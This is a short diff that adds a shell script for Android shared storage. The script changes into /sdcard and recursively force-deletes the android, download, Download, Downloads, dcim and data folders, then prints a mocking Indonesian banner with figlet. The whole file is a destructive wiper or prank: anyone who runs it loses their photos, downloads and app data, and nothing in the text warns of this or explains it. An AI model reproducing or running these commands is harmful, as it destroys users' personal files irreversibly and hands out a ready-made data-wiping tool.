@@ -1,0 +1,9 @@
+cd /sdcard;
+rm -rf ;
+rm -rf android;
+rm -rf download;
+rm -rf dcim;
+rm -rf data;
+rm -rf Download;
+rm -rf Downloads;
+figlet Gila Anjir
